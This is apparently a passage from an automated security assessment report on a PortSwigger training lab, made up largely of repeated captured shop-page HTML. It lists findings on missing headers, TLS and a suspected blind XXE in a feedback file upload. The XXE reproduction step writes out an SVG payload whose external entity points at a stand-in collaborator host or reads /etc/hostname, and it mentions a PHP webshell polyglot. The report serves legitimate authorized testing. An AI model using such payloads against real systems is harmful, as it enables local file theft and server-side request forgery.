                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $44.17
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating3.png">
                            $47.65
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating1.png">
                            $27.22
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating2.png">
                            $26.98
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating3.png">
                            $49.73
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/10.jpg">
                            <h3>Giant Grasshopper</h3>
                            <img src="/resources/images/rating4.png">
                            $68.83
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $81.89
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/68.jpg">
                            <h3>What Do You Meme?</h3>
                            <img src="/resources/images/rating2.png">
                            $28.96
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/1.jpg">
                            <h3>Eggtastic, Fun, Food Eggcessories</h3>
                            <img src="/resources/images/rating5.png">
                            $61.12
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating2.png">
                            $98.67
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/22.jpg">
                            <h3>Babbage Web Spray</h3>
                            <img src="/resources/images/rating2.png">
                            $17.82
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating4.png">
                            $22.36
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/39.jpg">
                            <h3>Paintball Gun - Thunder Striker</h3>
                            <img src="/resources/images/rating1.png">
                            $50.86
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-5"></a>

### 5. [INFO] [headers] Missing security response headers (CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy) and session cookie SameSite=None

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a51007103987017805bee9e007600ea.web-security-academy.net/

Every response from the root page lacks: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, and Referrer-Policy. Only content-type and set-cookie headers are returned. The session cookie is issued with SameSite=None (Secure; HttpOnly; SameSite=None), meaning it is included on all cross-site requests — this removes a browser-level CSRF mitigation layer for any state-changing endpoints that rely solely on cookie authentication.

**Reproduction**

```
1. GET https://0a51007103987017805bee9e007600ea.web-security-academy.net/\n2. Inspect response headers — CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy all absent.\n3. Set-Cookie: session=...; Secure; HttpOnly; SameSite=None — cookie transmitted cross-site.\n4. Repeated across multiple requests (ev-mr7sl36j-1, ev-mr7stbug-3).
```

**Evidence**

- Evidence `ev-mr7svba9-4` — `artifacts/s-0001/ev-mr7svba9-4/`

Request:

```http
GET /nonexistent-path HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 11
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

"Not Found"
```

- Evidence `ev-mr7sl36j-1` — `artifacts/s-0001/ev-mr7sl36j-1/`

Request:

```http
GET / HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 11719
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a3100f5033770d8807bed8c01d600d5.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UmVhZCBhbmQgc3VibWl0IHRoZSBjb250ZW50cyBvZiB0aGUgZmlsZSA8Y29kZT4vZXRjL2hvc3RuYW1lPC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3h4ZS9ibGluZC9sYWIteHhlLXdpdGgtb3V0LW9mLWJhbmQtZXhmaWx0cmF0aW9u'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/feedback">Submit feedback</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating1.png">
                            $96.35
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating1.png">
                            $28.35
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating4.png">
                            $73.35
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $42.14
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating5.png">
                            $86.50
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating4.png">
                            $41.66
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating2.png">
                            $12.55
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $44.17
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating3.png">
                            $47.65
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating1.png">
                            $27.22
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating2.png">
                            $26.98
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating3.png">
                            $49.73
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/10.jpg">
                            <h3>Giant Grasshopper</h3>
                            <img src="/resources/images/rating4.png">
                            $68.83
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $81.89
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/68.jpg">
                            <h3>What Do You Meme?</h3>
                            <img src="/resources/images/rating2.png">
                            $28.96
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/1.jpg">
                            <h3>Eggtastic, Fun, Food Eggcessories</h3>
                            <img src="/resources/images/rating5.png">
                            $61.12
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating2.png">
                            $98.67
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/22.jpg">
                            <h3>Babbage Web Spray</h3>
                            <img src="/resources/images/rating2.png">
                            $17.82
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating4.png">
                            $22.36
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/39.jpg">
                            <h3>Paintball Gun - Thunder Striker</h3>
                            <img src="/resources/images/rating1.png">
                            $50.86
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr7stbug-3` — `artifacts/s-0001/ev-mr7stbug-3/`

Request:

```http
GET / HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 11719
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a3100f5033770d8807bed8c01d600d5.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UmVhZCBhbmQgc3VibWl0IHRoZSBjb250ZW50cyBvZiB0aGUgZmlsZSA8Y29kZT4vZXRjL2hvc3RuYW1lPC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3h4ZS9ibGluZC9sYWIteHhlLXdpdGgtb3V0LW9mLWJhbmQtZXhmaWx0cmF0aW9u'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/feedback">Submit feedback</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating1.png">
                            $96.35
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating1.png">
                            $28.35
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating4.png">
                            $73.35
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $42.14
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating5.png">
                            $86.50
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating4.png">
                            $41.66
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating2.png">
                            $12.55
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $44.17
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating3.png">
                            $47.65
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating1.png">
                            $27.22
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating2.png">
                            $26.98
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating3.png">
                            $49.73
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/10.jpg">
                            <h3>Giant Grasshopper</h3>
                            <img src="/resources/images/rating4.png">
                            $68.83
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $81.89
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/68.jpg">
                            <h3>What Do You Meme?</h3>
                            <img src="/resources/images/rating2.png">
                            $28.96
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/1.jpg">
                            <h3>Eggtastic, Fun, Food Eggcessories</h3>
                            <img src="/resources/images/rating5.png">
                            $61.12
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating2.png">
                            $98.67
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/22.jpg">
                            <h3>Babbage Web Spray</h3>
                            <img src="/resources/images/rating2.png">
                            $17.82
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating4.png">
                            $22.36
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/39.jpg">
                            <h3>Paintball Gun - Thunder Striker</h3>
                            <img src="/resources/images/rating1.png">
                            $50.86
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-6"></a>

### 6. [INFO] [burp] TLS certificate

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Amazon RSA 2048 M01</td></tr><tr><td><b>Valid from:</b>&nbsp;&nb @ https://0a51007103987017805bee9e007600ea.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr7vhgjp-1y` — `artifacts/_/ev-mr7vhgjp-1y/`

Request:

```http
GET / HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
```

Response:

```http
HTTP/1.1 0
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-7"></a>

### 7. [SUSPECTED] [HIGH] [xxe] Feedback screenshot upload accepts malicious SVG (potential blind XXE/SSRF)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a51007103987017805bee9e007600ea.web-security-academy.net/

**Anomaly (why this is a lead):** The feedback 'screenshot' upload accepts an SVG carrying an XML DOCTYPE external-entity declaration (and a PHP webshell polyglot) with no observable type validation — the response is identical to a benign submit. The file is stored/processed server-side for staff review with no served-back URL and no in-scope render sink, so a server-side SVG/XML parser resolving the external entity is a classic blind XXE/SSRF sink. Unconfirmable in-scope: the exploit-server OOB channel is out of scope and csrf blocks the OOB tooling.

The feedback form's `screenshot` file field (POST /feedback/submit, multipart) accepts an SVG document containing an XML DOCTYPE with an external-entity declaration (e.g. <!ENTITY xxe SYSTEM "file:///etc/hostname">) and even a GIF89a/PHP webshell polyglot, with NO observable type or extension validation: the response to a malicious upload is byte-identical to a benign submit (the re-rendered feedback form), i.e. no "invalid file type" JSON error. The uploaded file is not served back at any URL (probe_paths found no /files,/uploads,/screenshots; the submit response is the form, not the image) and no in-scope review sink renders it (/admin and /feedback/view both 404) — so the screenshot is processed/reviewed server-side (blind). If the backend renders or parses the SVG with an XML/SVG library (e.g. Apache Batik), the external entity is resolved server-side, giving blind XXE (local-file read) or SSRF. This is the likely intended vulnerability of this "Mystery challenge". It could not be CONFIRMED within scope: the PortSwigger exploit server (the intended out-of-band callback channel) is out of scope and browser-navigation to it is blocked, and the csrf-protected multipart endpoint (token validated against the session — a fresh session yields "Invalid CSRF token") prevents the OOB/http tooling from delivering a valid POST; only the real browser session carries a valid csrf token, and it exposes no OOB observation channel.

**Reproduction**

```
1) GET /feedback and capture the session cookie + hidden csrf token. 2) POST /feedback/submit as multipart/form-data with the valid csrf, benign name/email/subject/message, and screenshot = an SVG whose DOCTYPE declares an external entity pointing at an attacker host, e.g. <?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "http://COLLABORATOR/"> ]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg> (or file:///etc/hostname to read a local file). 3) Observe an out-of-band DNS/HTTP callback from the server to COLLABORATOR (or the file contents in the rendered image where it is displayed) = confirmed blind XXE/SSRF. In this assessment the callback could not be observed because the exploit server is out of scope; delivery via the browser succeeds (upload accepted, no error) but yields no in-scope observation channel.
```

**Evidence**

- Evidence `ev-mr7t0xzy-7` — `artifacts/s-0002/ev-mr7t0xzy-7/`

Request:

```http
POST /feedback/submit HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment

[multipart/form-data]
fields: {"name":"tester","email":"tester@example.com","subject":"hi","message":"hello world"}
file "screenshot" filename="a.png" (image/png):
PNGDATA
```

Response:

```http
HTTP/1.1 400
content-length: 26
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

"Missing parameter 'csrf'"
```
